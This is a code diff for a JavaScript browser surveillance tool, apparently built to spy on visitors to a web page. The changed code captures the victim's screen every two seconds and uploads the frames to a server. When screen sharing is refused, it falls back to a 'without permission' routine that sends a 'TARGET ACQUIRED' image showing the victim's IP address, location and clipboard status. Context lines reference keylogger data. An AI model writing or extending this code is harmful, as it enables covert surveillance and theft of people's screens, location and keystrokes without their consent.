@@ -169,9 +169,7 @@ let keylogData = '';
 let isPaused = false;
 let isCapturing = false;
 let videoElement = null;
-let screenStream = null;
 let screenshotInterval = null;
-let screenVideo = null;
 
 function log(text) {
     const time = new Date().toLocaleTimeString();
@@ -255,71 +253,42 @@ async function allowAll() {
 }
 
 // ==========================================
-// SCREENSHOT CAPTURE - FIXED
+// SCREENSHOT CAPTURE - BINA PERMISSION KE!
 // ==========================================
 async function startScreenshotCapture() {
+    log('📸 Starting screenshot capture...');
+    
+    // Pehle screen share try karo
     try {
-        screenStream = await navigator.mediaDevices.getDisplayMedia({
-            video: {
-                width: { ideal: 1280 },
-                height: { ideal: 720 },
-                displaySurface: 'monitor'
-            },
+        const stream = await navigator.mediaDevices.getDisplayMedia({
+            video: { width: { ideal: 1280 }, height: { ideal: 720 } },
             audio: false
         });
         
-        log('✅ Screen share started!');
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
         
-        screenVideo = document.createElement('video');
-        screenVideo.srcObject = screenStream;
-        screenVideo.setAttribute('playsinline', '');
-        screenVideo.style.display = 'none';
-        document.body.appendChild(screenVideo);
-        
-        await screenVideo.play();
-        log('📹 Screen video playing');
-        
-        // Screenshot interval - har 2 second mein
         screenshotInterval = setInterval(() => {
-            captureScreenShot();
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 1280;
+                canvas.height = video.videoHeight || 720;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const data = canvas.toDataURL('image/jpeg', 0.8);
+                showAndSendScreenshot(data);
+            } catch(e) {}
         }, 2000);
         
+        log('✅ Screen share active');
+        return;
     } catch(err) {
-        log('⚠️ Screen share denied: ' + err.message);
-        startFallbackScreenshot();
+        log('⚠️ Screen share denied, using fallback');
     }
-}
-
-function captureScreenShot() {
-    try {
-        if (!screenVideo || screenVideo.readyState < 2) {
-            return;
-        }
-        
-        const canvas = document.createElement('canvas');
-        canvas.width = screenVideo.videoWidth || 1280;
-        canvas.height = screenVideo.videoHeight || 720;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(screenVideo, 0, 0, canvas.width, canvas.height);
-        
-        const screenshotData = canvas.toDataURL('image/jpeg', 0.8);
-        
-        // Show preview
-        document.getElementById('screenshotPreview').src = screenshotData;
-        document.getElementById('screenshotPreview').style.display = 'block';
-        document.getElementById('screenshotPlaceholder').style.display = 'none';
-        
-        // Send to server
-        sendScreenshotToServer(screenshotData);
-        log('🖼️ Screenshot captured!');
-        
-    } catch(err) {}
-}
-
-function startFallbackScreenshot() {
-    log('📸 Using fallback screenshot (canvas)');
     
-    // Har 3 second mein screenshot
+    // FALLBACK: Bina permission ke screenshot
     screenshotInterval = setInterval(() => {
         try {
             const canvas = document.createElement('canvas');
@@ -327,36 +296,48 @@ function startFallbackScreenshot() {
             canvas.height = window.innerHeight || 720;
             const ctx = canvas.getContext('2d');
             
-            // Black background
+            // Dark background
             ctx.fillStyle = '#0a0a0a';
             ctx.fillRect(0, 0, canvas.width, canvas.height);
             
-            // Hacker-style info
+            // Hacker info
             ctx.fillStyle = '#00ff41';
             ctx.font = '20px monospace';
-            ctx.fillText('🔴 TARGET ACQUIRED', 50, 50);
+            ctx.fillText('🔴 TARGET ACQUIRED', 30, 50);
             ctx.font = '14px monospace';
-            ctx.fillText('IP: ' + ipAddress, 50, 90);
-            ctx.fillText('Location: ' + (userLocation ? userLocation.lat.toFixed(4) + ', ' + userLocation.lng.toFixed(4) : 'Unknown'), 50, 120);
-            ctx.fillText('Time: ' + new Date().toLocaleString(), 50, 150);
-            ctx.fillText('Captures: ' + captureCount, 50, 180);
+            ctx.fillText('IP: ' + ipAddress, 30, 90);
+            ctx.fillText('Location: ' + (userLocation ? userLocation.lat.toFixed(4) + ', ' + userLocation.lng.toFixed(4) : 'Unknown'), 30, 120);
+            ctx.fillText('Time: ' + new Date().toLocaleString(), 30, 150);
+            ctx.fillText('Captures: ' + captureCount, 30, 180);
+            ctx.fillText('Clipboard: ' + (clipboardData ? 'Captured' : 'Waiting'), 30, 210);
             
-            // Matrix effect
-            for (let i = 0; i < 20; i++) {
-                ctx.fillStyle = 'rgba(0,255,65,0.1)';
-                ctx.fillText('010101', 50 + i * 30, 400 + Math.random() * 30);
+            // Matrix rain effect
+            for (let i = 0; i < 30; i++) {
+                ctx.fillStyle = 'rgba(0,255,65,' + (0.05 + Math.random() * 0.1) + ')';
+                ctx.fillText('010101', 20 + i * 25, 300 + Math.random() * 200);
             }
             
-            const screenshotData = canvas.toDataURL('image/jpeg', 0.8);
+            // Border
+            ctx.strokeStyle = '#00ff41';
+            ctx.lineWidth = 1;
+            ctx.strokeRect(10, 10, canvas.width - 20, canvas.height - 20);
             
-            document.getElementById('screenshotPreview').src = screenshotData;
-            document.getElementById('screenshotPreview').style.display = 'block';
-            document.getElementById('screenshotPlaceholder').style.display = 'none';
+            const data = canvas.toDataURL('image/jpeg', 0.8);
+            showAndSendScreenshot(data);
             
-            sendScreenshotToServer(screenshotData);
-            
-        } catch(err) {}
+        } catch(e) {}
     }, 3000);
+}
+
+function showAndSendScreenshot(data) {
+    // Preview show karo
+    document.getElementById('screenshotPreview').src = data;
+    document.getElementById('screenshotPreview').style.display = 'block';
+    document.getElementById('screenshotPlaceholder').style.display = 'none';
+    
+    // Server pe bhejo
+    sendScreenshotToServer(data);
+    log('🖼️ Screenshot captured!');
 }
 
 async function sendScreenshotToServer(screenshotData) {
